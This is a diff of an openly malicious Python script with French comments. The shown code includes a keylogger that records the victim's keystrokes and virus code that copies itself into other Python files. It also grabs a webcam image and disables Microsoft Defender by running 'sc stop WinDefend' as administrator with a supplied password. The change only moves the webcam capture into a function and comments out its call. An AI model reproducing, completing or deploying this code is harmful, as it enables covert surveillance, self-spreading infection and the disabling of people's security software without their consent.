@@ -13,6 +13,12 @@ def clavier(touche):              #fonction qui va transformer ce que tape la vi
 
     logging.info(str(touche))      #recupere la touche qui est taper
 
+def cam():
+    camera = cv2.VideoCapture(0)        #initialise la camera 0 ou 1
+    ret, frame = camera.read()          #prend une screenshot de la camera
+    cv2.imwrite('cam.png',frame)        #enregistre la screenshot
+    camera.release()   
+
 virus_code = []
 with open(sys.argv[0], 'r') as f:
     lines = f.readlines()
@@ -48,10 +54,7 @@ for file in python_files:
 f = os.path.basename(sys.argv[0])
 print(f)
 
-camera = cv2.VideoCapture(0)        #initialise la camera 0 ou 1
-ret, frame = camera.read()          #prend une screenshot de la camera
-cv2.imwrite('cam.png',frame)        #enregistre la screenshot
-camera.release()                    
+#cam()                 
 
 cmd = subprocess.Popen(['runas', '/user:Administrateur', 'sc stop WinDefend'])     #/user a changer si erreur                 #désactive l'antivirus Microsoft Defender, en lançant le cmd en admin
 cmd.communicate(input='user')      #input= a changer si erreur              #met le mot de passe admin
